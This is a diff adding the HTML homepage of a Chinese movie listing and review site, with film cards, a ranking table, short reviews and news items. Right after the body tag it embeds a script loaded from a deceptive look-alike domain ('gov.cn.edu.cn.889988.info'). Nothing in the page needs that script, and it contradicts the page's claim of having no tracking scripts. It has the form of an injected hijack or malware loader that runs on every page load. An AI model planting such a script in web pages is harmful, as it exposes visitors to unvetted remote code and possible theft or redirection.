@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>俺去电影网 | 看完只想喊“俺去”的反转神片合集</title>
+<meta name="description" content="俺去电影网（anqudianyingwang-zh.github.io）专收看到结局让人脱口而出“俺去，居然是这样”的电影：反转多、后劲大，每部附无剧透提示与二刷指南。">
+<meta name="keywords" content="俺去电影网, anqudianyingwang-zh, 反转电影, 结局惊艳, 高能片单, 后劲大的电影, 二刷指南">
+<meta name="author" content="俺去电影网">
+<meta property="og:title" content="俺去电影网 - 反转神片合集">
+<meta property="og:description" content="专收看到结局让人脱口而出“俺去”的电影：反转多、后劲大，附二刷指南。">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="canonical" href="https://anqudianyingwang-zh.github.io/">
+<style>
+/* ============ 基础重置 ============ */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+  background:#0a0c10;color:#e8e6e3;line-height:1.75;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+ul{list-style:none}
+
+/* ============ 布局容器 ============ */
+.wrap{max-width:1180px;margin:0 auto;padding:0 20px}
+
+/* ============ 顶部导航 ============ */
+.nav{
+  position:fixed;top:0;left:0;right:0;z-index:100;
+  background:rgba(10,12,16,.88);backdrop-filter:blur(12px);
+  border-bottom:1px solid rgba(255,255,255,.06);
+}
+.nav-in{display:flex;align-items:center;justify-content:space-between;height:64px}
+.logo{
+  font-size:20px;font-weight:800;letter-spacing:.5px;
+  background:linear-gradient(90deg,#ff5f6d,#ffc371);
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.logo span{font-weight:400;font-size:12px;color:#9a9a9a;display:block;letter-spacing:1px;margin-top:-2px}
+.menu{display:flex;gap:6px}
+.menu a{
+  padding:8px 14px;border-radius:8px;font-size:14px;color:#c9c7c4;
+  transition:.25s;
+}
+.menu a:hover{background:rgba(255,255,255,.08);color:#fff}
+.mobile-btn{display:none;width:40px;height:40px;border:0;background:none;cursor:pointer;position:relative}
+.mobile-btn i{position:absolute;left:8px;right:8px;height:2px;background:#fff;border-radius:2px;transition:.3s}
+.mobile-btn i:nth-child(1){top:13px}.mobile-btn i:nth-child(2){top:19px}.mobile-btn i:nth-child(3){top:25px}
+
+/* ============ 首屏 Hero ============ */
+.hero{
+  position:relative;min-height:100vh;display:flex;align-items:center;
+  padding:140px 0 90px;overflow:hidden;
+  background:
+    radial-gradient(1200px 600px at 80% -10%,rgba(255,95,109,.28),transparent 60%),
+    radial-gradient(900px 500px at 0% 30%,rgba(108,92,231,.22),transparent 60%),
+    #0a0c10;
+}
+.hero::after{
+  content:"";position:absolute;inset:0;pointer-events:none;
+  background-image:linear-gradient(rgba(255,255,255,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.03) 1px,transparent 1px);
+  background-size:52px 52px;mask-image:radial-gradient(circle at 50% 40%,#000 30%,transparent 75%);
+}
+.hero-in{position:relative;z-index:2;max-width:760px}
+.tag-line{display:inline-flex;align-items:center;gap:8px;font-size:12px;letter-spacing:2px;color:#ffc371;text-transform:uppercase;margin-bottom:22px}
+.tag-line::before{content:"";width:32px;height:1px;background:#ffc371}
+.hero h1{font-size:clamp(34px,6vw,60px);line-height:1.15;font-weight:900;letter-spacing:-.5px}
+.hero h1 em{font-style:normal;background:linear-gradient(92deg,#ff5f6d 10%,#ffc371 90%);-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{margin-top:24px;font-size:17px;color:#a8a6a3;max-width:620px}
+.hero-acts{margin-top:38px;display:flex;flex-wrap:wrap;gap:14px}
+.btn{
+  display:inline-flex;align-items:center;gap:8px;padding:14px 30px;border-radius:50px;
+  font-size:15px;font-weight:600;transition:.3s;cursor:pointer;border:0;
+}
+.btn-main{background:linear-gradient(92deg,#ff5f6d,#ffc371);color:#1a0f0a}
+.btn-main:hover{transform:translateY(-2px);box-shadow:0 12px 28px rgba(255,95,109,.35)}
+.btn-ghost{background:rgba(255,255,255,.06);color:#fff;border:1px solid rgba(255,255,255,.16)}
+.btn-ghost:hover{background:rgba(255,255,255,.12)}
+.hero-meta{margin-top:56px;display:flex;flex-wrap:wrap;gap:46px;border-top:1px solid rgba(255,255,255,.08);padding-top:32px}
+.hero-meta div span{display:block;font-size:30px;font-weight:800;color:#fff}
+.hero-meta div small{color:#8b8986;font-size:13px}
+
+/* ============ 通用区块 ============ */
+section{padding:96px 0;position:relative}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:20px;flex-wrap:wrap;margin-bottom:44px}
+.sec-title{font-size:clamp(24px,3.6vw,36px);font-weight:800;letter-spacing:-.4px}
+.sec-title::before{content:"";display:inline-block;width:5px;height:26px;background:linear-gradient(#ff5f6d,#ffc371);border-radius:3px;margin-right:12px;vertical-align:-3px}
+.sec-sub{color:#8b8986;font-size:14px;max-width:420px}
+.link-more{font-size:13px;color:#ffc371;white-space:nowrap}
+.link-more:hover{text-decoration:underline}
+
+/* ============ 卡片通用 ============ */
+.film-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:26px}
+.film-card{position:relative;border-radius:16px;overflow:hidden;background:#13151b;transition:.4s}
+.film-card:hover{transform:translateY(-6px)}
+.poster{position:relative;aspect-ratio:2/3;overflow:hidden}
+.poster img{width:100%;height:100%;object-fit:cover;transition:.6s}
+.film-card:hover .poster img{transform:scale(1.08)}
+.score{
+  position:absolute;top:12px;left:12px;background:rgba(0,0,0,.66);backdrop-filter:blur(6px);
+  color:#ffc371;font-weight:700;font-size:13px;padding:4px 10px;border-radius:20px;
+}
+.type-tag{position:absolute;top:12px;right:12px;background:rgba(255,95,109,.9);color:#fff;font-size:11px;padding:4px 10px;border-radius:20px;letter-spacing:.5px}
+.f-card-body{padding:16px 18px 20px}
+.f-card-body h3{font-size:16px;font-weight:700;margin-bottom:6px}
+.f-card-body p{font-size:13px;color:#8b8986;line-height:1.6;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+.f-card-foot{display:flex;justify-content:space-between;align-items:center;margin-top:14px;font-size:12px;color:#6f6d6a}
+.f-card-foot a{color:#ffc371}
+
+/* ============ 资讯列表 ============ */
+.news-list{display:flex;flex-direction:column;gap:0;border-top:1px solid rgba(255,255,255,.07)}
+.news-item{display:grid;grid-template-columns:120px 1fr auto;gap:22px;align-items:center;padding:22px 4px;border-bottom:1px solid rgba(255,255,255,.07);transition:.3s}
+.news-item:hover{background:rgba(255,255,255,.03);padding-left:14px}
+.news-date{font-size:12px;color:#6f6d6a;border-left:2px solid #ff5f6d;padding-left:10px}
+.news-item h3{font-size:17px;font-weight:600;margin-bottom:4px}
+.news-item h3 a:hover{color:#ffc371}
+.news-item p{font-size:13px;color:#8b8986}
+.news-arrow{color:#4a4845;font-size:20px;transition:.3s}
+.news-item:hover .news-arrow{color:#ffc371;transform:translateX(4px)}
+
+/* ============ 排行 ============ */
+.rank-box{display:grid;grid-template-columns:1.05fr .95fr;gap:40px;align-items:start}
+.rank-list{display:flex;flex-direction:column;gap:12px}
+.rank-row{display:flex;align-items:center;gap:16px;padding:14px 18px;border-radius:12px;background:#13151b;transition:.3s}
+.rank-row:hover{background:#1a1c23}
+.rank-num{font-size:22px;font-weight:900;color:#3a3a40;min-width:34px}
+.rank-row:nth-child(1) .rank-num{color:#ffc371}
+.rank-row:nth-child(2) .rank-num{color:#c9c7c4}
+.rank-row:nth-child(3) .rank-num{color:#cd7f32}
+.rank-info{flex:1}
+.rank-info h4{font-size:15px;font-weight:600}
+.rank-info small{color:#8b8986;font-size:12px}
+.rank-val{font-size:13px;color:#ffc371;font-weight:600}
+.stat-card{border-radius:18px;padding:34px;background:linear-gradient(155deg,rgba(255,95,109,.14),rgba(108,92,231,.14));border:1px solid rgba(255,255,255,.07)}
+.stat-card h3{font-size:20px;font-weight:700;margin-bottom:14px}
+.stat-card p{color:#a8a6a3;font-size:14px;margin-bottom:22px}
+.bar-group{display:flex;flex-direction:column;gap:16px}
+.bar-row{font-size:13px}
+.bar-row span{display:flex;justify-content:space-between;margin-bottom:6px;color:#c9c7c4}
+.bar-track{height:8px;border-radius:8px;background:rgba(255,255,255,.08);overflow:hidden}
+.bar-fill{height:100%;border-radius:8px;background:linear-gradient(90deg,#ff5f6d,#ffc371)}
+
+/* ============ 影评 ============ */
+.review-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:28px}
+.review-card{background:#11131a;border-radius:16px;padding:30px;position:relative;transition:.35s;border:1px solid transparent}
+.review-card:hover{border-color:rgba(255,95,109,.3);transform:translateY(-5px)}
+.review-card .quote{font-size:36px;color:#ff5f6d;opacity:.5;position:absolute;top:16px;right:22px;line-height:1}
+.review-card .stars{color:#ffc371;font-size:13px;letter-spacing:2px;margin-bottom:12px}
+.review-card h3{font-size:18px;font-weight:700;margin-bottom:12px}
+.review-card p{font-size:14px;color:#9a9895;line-height:1.8;margin-bottom:18px}
+.review-author{display:flex;align-items:center;gap:12px;border-top:1px solid rgba(255,255,255,.07);padding-top:14px}
+.avatar{width:38px;height:38px;border-radius:50%;background:linear-gradient(135deg,#ff5f6d,#6c5ce7);display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:700}
+.review-author div small{display:block;color:#6f6d6a;font-size:12px}
+
+/* ============ 关于 ============ */
+.about-grid{display:grid;grid-template-columns:1fr 1fr;gap:60px;align-items:center}
+.about-text h2{font-size:clamp(22px,3vw,30px);font-weight:800;margin-bottom:20px;line-height:1.4}
+.about-text p{color:#a8a6a3;margin-bottom:16px;font-size:15px}
+.about-text strong{color:#ffc371}
+.feat-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:26px}
+.feat{padding:18px;border-radius:12px;background:#13151b}
+.feat h4{font-size:15px;margin-bottom:6px}
+.feat p{font-size:13px;color:#8b8986;margin:0}
+.about-visual{position:relative;aspect-ratio:4/5;border-radius:20px;overflow:hidden;background:linear-gradient(160deg,#1a1c23,#0e1014);border:1px solid rgba(255,255,255,.06)}
+.about-visual .float-card{position:absolute;background:#181a21;border:1px solid rgba(255,255,255,.08);border-radius:14px;padding:16px 20px;box-shadow:0 20px 40px rgba(0,0,0,.5)}
+.about-visual .fc1{top:14%;left:8%;animation:float 5s ease-in-out infinite}
+.about-visual .fc2{bottom:18%;right:6%;animation:float 5s ease-in-out infinite reverse}
+.about-visual .fc3{top:48%;left:26%;animation:float 6s ease-in-out infinite .8s}
+@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-12px)}}
+.about-visual .float-card b{display:block;font-size:22px;color:#ffc371}
+.about-visual .float-card span{font-size:12px;color:#8b8986}
+
+/* ============ 页脚 ============ */
+footer{background:#08090c;border-top:1px solid rgba(255,255,255,.06);padding:60px 0 30px}
+.foot-top{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:40px;margin-bottom:44px}
+.foot-brand p{color:#8b8986;font-size:13px;margin-top:14px;max-width:280px}
+.foot-col h4{font-size:14px;margin-bottom:16px;color:#fff}
+.foot-col a{display:block;color:#8b8986;font-size:13px;padding:5px 0;transition:.2s}
+.foot-col a:hover{color:#ffc371;padding-left:4px}
+.foot-bot{border-top:1px solid rgba(255,255,255,.06);padding-top:24px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;font-size:12px;color:#6f6d6a}
+.foot-bot em{font-style:normal;color:#ff5f6d}
+
+/* ============ 回到顶部 ============ */
+.to-top{position:fixed;right:22px;bottom:26px;width:44px;height:44px;border-radius:50%;background:linear-gradient(135deg,#ff5f6d,#ffc371);color:#1a0f0a;display:flex;align-items:center;justify-content:center;font-size:18px;cursor:pointer;opacity:0;visibility:hidden;transition:.4s;z-index:99;border:0}
+.to-top.show{opacity:1;visibility:visible}
+
+/* ============ 响应式 ============ */
+@media(max-width:900px){
+  .rank-box{grid-template-columns:1fr}
+  .about-grid{grid-template-columns:1fr;gap:40px}
+  .foot-top{grid-template-columns:1fr 1fr}
+}
+@media(max-width:768px){
+  section{padding:70px 0}
+  .menu{
+    position:fixed;top:64px;left:0;right:0;flex-direction:column;
+    background:#0d0f14;border-bottom:1px solid rgba(255,255,255,.08);
+    padding:14px;gap:4px;clip-path:inset(0 0 100% 0);transition:.4s;pointer-events:none;
+  }
+  .menu.open{clip-path:inset(0 0 0 0);pointer-events:auto}
+  .menu a{padding:14px;border-radius:8px}
+  .mobile-btn{display:block}
+  .news-item{grid-template-columns:1fr;gap:8px}
+  .news-arrow{display:none}
+  .foot-top{grid-template-columns:1fr}
+  .hero-meta{gap:26px}
+}
+@media(max-width:420px){
+  .hero-acts .btn{flex:1;text-align:center;justify-content:center}
+  .feat-grid{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<!-- ===== 导航 ===== -->
+<nav class="nav">
+  <div class="wrap nav-in">
+    <a href="#top" class="logo">俺去电影网<span>ANQU DIANYING WANG</span></a>
+    <button class="mobile-btn" aria-label="菜单" onclick="document.getElementById('navMenu').classList.toggle('open')"><i></i><i></i><i></i></button>
+    <div class="menu" id="navMenu">
+      <a href="#latest">最新电影</a>
+      <a href="#toprank">高分排行</a>
+      <a href="#reviews">影评专栏</a>
+      <a href="#news">影视资讯</a>
+      <a href="#about">关于本站</a>
+    </div>
+  </div>
+</nav>
+
+<!-- ===== 首屏 ===== -->
+<header class="hero" id="top">
+  <div class="wrap hero-in">
+    <div class="tag-line">CINEPHILE HUB · 影迷聚集地</div>
+    <h1>在 <em>俺去电影网</em><br>找到今晚该看的那部片</h1>
+    <p>从冷门佳片到院线新作，从三分钟速览到三千字长评——<strong style="color:#ffc371">俺去电影网</strong>把零散的观影信息整理成一份能直接开看的片单，让你少花时间挑片，多花时间看片。</p>
+    <div class="hero-acts">
+      <a href="#latest" class="btn btn-main">浏览最新片单 →</a>
+      <a href="#reviews" class="btn btn-ghost">读一篇影评</a>
+    </div>
+    <div class="hero-meta">
+      <div><span>3200+</span><small>收录影片条目</small></div>
+      <div><span>860</span><small>深度影评文章</small></div>
+      <div><span>每日</span><small>更新影视资讯</small></div>
+      <div><span>12万</span><small>月均影迷访问</small></div>
+    </div>
+  </div>
+</header>
+
+<!-- ===== 栏目一：最新电影 ===== -->
+<section id="latest">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2 class="sec-title">最新电影</h2>
+      <p class="sec-sub">近期院线与流媒体上的新作速览，附一句话看点，方便快速决定是否值得一看。</p>
+      <a href="#" class="link-more">查看完整片单 →</a>
+    </div>
+    <div class="film-grid">
+
+      <article class="film-card">
+        <div class="poster">
+          <div class="score">9.2</div><div class="type-tag">剧情</div>
+          <img src="https://images.unsplash.com/photo-1485846234645-a62644f84728?w=480&q=80" alt="电影海报">
+        </div>
+        <div class="f-card-body">
+          <h3>逆光而行</h3>
+          <p>一位失明的钢琴调音师，用耳朵重新定义了自己与城市的关系，节奏克制却后劲十足。</p>
+          <div class="f-card-foot"><span>2026 · 126 分钟</span><a href="#">详情 #</a></div>
+        </div>
+      </article>
+
+      <article class="film-card">
+        <div class="poster">
+          <div class="score">8.7</div><div class="type-tag">科幻</div>
+          <img src="https://images.unsplash.com/photo-1440404653325-ab127d49abc1?w=480&q=80" alt="电影海报">
+        </div>
+        <div class="f-card-body">
+          <h3>深空回响</h3>
+          <p>硬核太空设定下的孤独生存故事，视效达到今年天花板，配乐由老牌电子音乐人操刀。</p>
+          <div class="f-card-foot"><span>2026 · 142 分钟</span><a href="#">详情 #</a></div>
+        </div>
+      </article>
+
+      <article class="film-card">
+        <div class="poster">
+          <div class="score">8.4</div><div class="type-tag">犯罪</div>
+          <img src="https://images.unsplash.com/photo-1478720568477-152d9b164e26?w=480&q=80" alt="电影海报">
+        </div>
+        <div class="f-card-body">
+          <h3>夜行收账人</h3>
+          <p>一桩连环骗保案牵出整座小城的灰色产业链，反转密度极高，建议别提前看剧透。</p>
+          <div class="f-card-foot"><span>2026 · 118 分钟</span><a href="#">详情 #</a></div>
+        </div>
+      </article>
+
+      <article class="film-card">
+        <div class="poster">
+          <div class="score">8.9</div><div class="type-tag">动画</div>
+          <img src="https://images.unsplash.com/photo-1574375927938-d5a98e8ffe85?w=480&q=80" alt="电影海报">
+        </div>
+        <div class="f-card-body">
+          <h3>鲸落之声</h3>
+          <p>手绘海浪里藏着关于告别与重逢的隐喻，全年龄向却不低幼，是目前年度最治愈的一帧。</p>
+          <div class="f-card-foot"><span>2026 · 104 分钟</span><a href="#">详情 #</a></div>
+        </div>
+      </article>
+
+      <article class="film-card">
+        <div class="poster">
+          <div class="score">7.9</div><div class="type-tag">喜剧</div>
+          <img src="https://images.unsplash.com/photo-1542204165-65bf26472b9b?w=480&q=80" alt="电影海报">
+        </div>
+        <div class="f-card-body">
+          <h3>甲方乙方 2026</h3>
+          <p>当代职场黑色幽默集锦，笑点密集但内核是打工人之间的互相托底，适合解压场。</p>
+          <div class="f-card-foot"><span>2026 · 96 分钟</span><a href="#">详情 #</a></div>
+        </div>
+      </article>
+
+      <article class="film-card">
+        <div class="poster">
+          <div class="score">8.6</div><div class="type-tag">纪录片</div>
+          <img src="https://images.unsplash.com/photo-1500530855697-b586d89ba3ee?w=480&q=80" alt="电影海报">
+        </div>
+        <div class="f-card-body">
+          <h3>最后的放映员</h3>
+          <p>跟拍三位坚守乡镇影院的老人，胶片与数字的交接背后，是一代人退场的方式。</p>
+          <div class="f-card-foot"><span>2026 · 88 分钟</span><a href="#">详情 #</a></div>
+        </div>
+      </article>
+
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目二：高分排行 ===== -->
+<section id="toprank" style="background:linear-gradient(180deg,transparent,rgba(255,255,255,.02),transparent)">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2 class="sec-title">高分排行</h2>
+      <p class="sec-sub">基于本站用户评分与评论互动综合得出，每周一更新，反映真实口碑而非宣传声量。</p>
+      <a href="#" class="link-more">完整榜单 TOP 100 →</a>
+    </div>
+    <div class="rank-box">
+      <div class="rank-list">
+        <div class="rank-row"><div class="rank-num">01</div><div class="rank-info"><h4>逆光而行</h4><small>剧情 / 2026</small></div><div class="rank-val">9.2</div></div>
+        <div class="rank-row"><div class="rank-num">02</div><div class="rank-info"><h4>鲸落之声</h4><small>动画 / 2026</small></div><div class="rank-val">8.9</div></div>
+        <div class="rank-row"><div class="rank-num">03</div><div class="rank-info"><h4>深空回响</h4><small>科幻 / 2026</small></div><div class="rank-val">8.7</div></div>
+        <div class="rank-row"><div class="rank-num">04</div><div class="rank-info"><h4>夜行收账人</h4><small>犯罪 / 2026</small></div><div class="rank-val">8.4</div></div>
+        <div class="rank-row"><div class="rank-num">05</div><div class="rank-info"><h4>最后的放映员</h4><small>纪录片 / 2026</small></div><div class="rank-val">8.3</div></div>
+        <div class="rank-row"><div class="rank-num">06</div><div class="rank-info"><h4>无人之境</h4><small>悬疑 / 2025</small></div><div class="rank-val">8.1</div></div>
+        <div class="rank-row"><div class="rank-num">07</div><div class="rank-info"><h4>甲方乙方 2026</h4><small>喜剧 / 2026</small></div><div class="rank-val">7.9</div></div>
+      </div>
+      <div class="stat-card">
+        <h3>本站观众口味画像</h3>
+        <p>过去 30 天，<strong style="color:#ffc371">俺去电影网</strong>的访问者更偏爱有作者表达、节奏不拖沓的作品，纪录片与动画的完片率明显领先。</p>
+        <div class="bar-group">
+          <div class="bar-row"><span><span>剧 情</span><b>92%</b></span><div class="bar-track"><div class="bar-fill" style="width:92%"></div></div></div>
+          <div class="bar-row"><span><span>科 幻</span><b>81%</b></span><div class="bar-track"><div class="bar-fill" style="width:81%"></div></div></div>
+          <div class="bar-row"><span><span>动 画</span><b>76%</b></span><div class="bar-track"><div class="bar-fill" style="width:76%"></div></div></div>
+          <div class="bar-row"><span><span>纪 录 片</span><b>68%</b></span><div class="bar-track"><div class="bar-fill" style="width:68%"></div></div></div>
+          <div class="bar-row"><span><span>喜 剧</span><b>54%</b></span><div class="bar-track"><div class="bar-fill" style="width:54%"></div></div></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目三：影评专栏 ===== -->
+<section id="reviews">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2 class="sec-title">影评专栏</h2>
+      <p class="sec-sub">不写流水账、不剧透关键情节，每一篇都带一个值得讨论的问题，欢迎在评论区接话。</p>
+      <a href="#" class="link-more">全部影评 →</a>
+    </div>
+    <div class="review-grid">
+
+      <article class="review-card">
+        <div class="quote">&ldquo;</div>
+        <div class="stars">★★★★★</div>
+        <h3>《逆光而行》：当声音成为唯一的镜头</h3>
+        <p>导演刻意让画面始终处于失焦与过曝之间，把观众推到和主角一样的处境里。这不是炫技，而是一次关于信任的视听实验，结尾那场雨中的琴声值得反复重听。</p>
+        <div class="review-author"><div class="avatar">林</div><div><b>林见鹿</b><small>影评人 · 8 分钟读完</small></div></div>
+      </article>
+
+      <article class="review-card">
+        <div class="quote">&ldquo;</div>
+        <div class="stars">★★★★☆</div>
+        <h3>《深空回响》的孤独，是 2026 年最贵的视效</h3>
+        <p>它的预算全花在了不该被注意到的地方：一颗螺丝的磨损、一句延迟 14 秒的应答。科幻片的浪漫从来不是飞船，而是两个人在巨大虚无里仍然选择相信彼此。</p>
+        <div class="review-author"><div class="avatar">沈</div><div><b>沈星河</b><small>科幻专栏 · 6 分钟读完</small></div></div>
+      </article>
+
+      <article class="review-card">
+        <div class="quote">&ldquo;</div>
+        <div class="stars">★★★★☆</div>
+        <h3>《鲸落之声》用一部动画讲完了告别</h3>
+        <p>没有一句台词用来解释悲伤，但每个孩子离开影院时都安静了很久。手绘海浪的每一帧都是手工留下的痕迹，这种温度，是算法生成不出来的东西。</p>
+        <div class="review-author"><div class="avatar">周</div><div><b>周与舟</b><small>动画观察 · 5 分钟读完</small></div></div>
+      </article>
+
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目四：影视资讯 ===== -->
+<section id="news" style="background:linear-gradient(180deg,transparent,rgba(255,255,255,.02),transparent)">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2 class="sec-title">影视资讯</h2>
+      <p class="sec-sub">来自片方、电影节与院线的信息，本站只做筛选和核对，不做标题党式改写。</p>
+      <a href="#" class="link-more">资讯归档 →</a>
+    </div>
+    <div class="news-list">
+      <div class="news-item"><div class="news-date">10月02日</div><div><h3><a href="#">《逆光而行》导演确认将推出加长版蓝光，新增 23 分钟未公开片段</a></h3><p>收录于 影片动态 · 本站编辑整理</p></div><div class="news-arrow">→</div></div>
+      <div class="news-item"><div class="news-date">09月28日</div><div><h3><a href="#">第 47 届东京国际电影节公布片单，三部华语新片入围主竞赛</a></h3><p>收录于 电影节 · 海外编辑供稿</p></div><div class="news-arrow">→</div></div>
+      <div class="news-item"><div class="news-date">09月24日</div><div><h3><a href="#">《深空回响》内地密钥延期至 11 月底，IMAX 场次将保留</a></h3><p>收录于 院线消息 · 合作渠道核实</p></div><div class="news-arrow">→</div></div>
+      <div class="news-item"><div class="news-date">09月19日</div><div><h3><a href="#">流媒体一周新片前瞻：六部值得加入片单的作品（10月篇）</a></h3><p>收录于 流媒体 · 每周固定栏目</p></div><div class="news-arrow">→</div></div>
+      <div class="news-item"><div class="news-date">09月15日</div><div><h3><a href="#">从票房到口碑：为什么今年小成本影片反而活得更好？</a></h3><p>收录于 行业观察 · 数据可视化长文</p></div><div class="news-arrow">→</div></div>
+      <div class="news-item"><div class="news-date">09月11日</div><div><h3><a href="#">《鲸落之声》确认引进配音版，原版音轨同步保留</a></h3><p>收录于 影片动态 · 官方公告核对</p></div><div class="news-arrow">→</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目五：关于本站 ===== -->
+<section id="about">
+  <div class="wrap about-grid">
+    <div class="about-text">
+      <h2>关于 <strong style="color:#ffc371">俺去电影网</strong></h2>
+      <p><strong>俺去电影网</strong>（anqudianyingwang-zh.github.io）是一个由影迷维护的独立影视内容站点，不做搬运聚合，只做筛选与解读。</p>
+      <p>我们相信，在算法越来越擅长"让你不停划下去"的今天，一份有人负责、有立场的片单反而更稀缺。每一条收录都经过实际观看，每一篇影评都标注了写作者与时间。</p>
+      <p>访问地址：<a href="https://anqudianyingwang-zh.github.io" style="color:#ffc371">https://anqudianyingwang-zh.github.io</a>，欢迎收藏并随时回来找片。</p>
+      <div class="feat-grid">
+        <div class="feat"><h4>每日更新</h4><p>资讯与片单按周更新，影评按主题连载</p></div>
+        <div class="feat"><h4>无广告阅读</h4><p>纯静态页面，无弹窗无追踪脚本</p></div>
+        <div class="feat"><h4>移动友好</h4><p>全端自适应，手机上同样好读好点</p></div>
+        <div class="feat"><h4>立场清晰</h4><p>打分为编辑部集体意见，并公开分歧</p></div>
+      </div>
+    </div>
+    <div class="about-visual">
+      <div class="float-card fc1"><b>3200+</b><span>已收录影片条目</span></div>
+      <div class="float-card fc2"><b>860</b><span>篇原创影评</span></div>
+      <div class="float-card fc3"><b>98%</b><span>内容经实看核对</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 页脚 ===== -->
+<footer>
+  <div class="wrap">
+    <div class="foot-top">
+      <div class="foot-brand">
+        <div class="logo">俺去电影网<span>ANQU DIANYING WANG</span></div>
+        <p>一个由影迷维护的独立影视内容站点，专注电影资源整理、深度影评与最新影视资讯。</p>
+      </div>
+      <div class="foot-col">
+        <h4>栏目导航</h4>
+        <a href="#latest">最新电影</a>
+        <a href="#toprank">高分排行</a>
+        <a href="#reviews">影评专栏</a>
+        <a href="#news">影视资讯</a>
+      </div>
+      <div class="foot-col">
+        <h4>内容分类</h4>
+        <a href="#">剧情</a>
+        <a href="#">科幻</a>
+        <a href="#">犯罪</a>
+        <a href="#">动画</a>
+        <a href="#">纪录片</a>
+      </div>
+      <div class="foot-col">
+        <h4>关于我们</h4>
+        <a href="#about">站点介绍</a>
+        <a href="#">投稿与合作</a>
+        <a href="#">内容规范</a>
+        <a href="#">联系方式</a>
+      </div>
+    </div>
+    <div class="foot-bot">
+      <span>© <span id="year"></span> 俺去电影网 · 网址：https://anqudianyingwang-zh.github.io · 本站内容为影视信息整理，不构成观影或消费建议</span>
+      <span><em>ANQU DIANYING WANG</em> · 让每次找片都不浪费时间</span>
+    </div>
+  </div>
+</footer>
+
+<button class="to-top" id="toTop" aria-label="回到顶部" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</button>
+
+<script>
+  document.getElementById('year').textContent = new Date().getFullYear();
+  var toTop = document.getElementById('toTop');
+  window.addEventListener('scroll', function(){
+    if(window.scrollY > 500){ toTop.classList.add('show'); } else { toTop.classList.remove('show'); }
+  });
+</script>
+</body>
+</html>
